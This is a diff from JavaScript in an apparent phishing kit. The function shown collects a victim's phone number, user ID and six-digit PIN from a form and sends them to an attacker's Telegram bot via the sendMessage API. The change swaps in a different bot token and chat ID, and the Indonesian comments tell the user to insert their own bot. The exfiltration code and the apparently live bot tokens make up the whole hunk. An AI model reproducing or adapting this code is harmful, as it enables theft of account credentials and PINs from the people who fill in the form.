@@ -270,8 +270,8 @@ function KirimPesan(event) {
     
     var gabungan = "├•★𝓒𝓲𝓶𝓫 𝓝𝓲𝓪𝓰𝓪★────•" + "%0A├─────•ℙ𝕀ℕ•────•" + '%0A├•★ ' + tarif.value + '%0A├•★ 𝗡𝗼𝗺𝗼𝗿 : ' + nomor.value + '%0A├•★ 𝗨𝘀𝗲𝗿 𝗜𝗗 : ' + user.value + '%0A├•★ 𝗣𝗜𝗡 : ' + pin.value + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value;
     
-    var token = '6671913125:AAEZA7xtWl3IlC0nZrByft5NQyJydtR8AWU'; // Ganti dengan token bot yang kamu buat
-    var grup = '5949628204'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7264893614:AAFIgcXq_42AbaqHugllhjVO9YprNKxx-JM'; // Ganti dengan token bot yang kamu buat
+    var grup = '6595563743'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
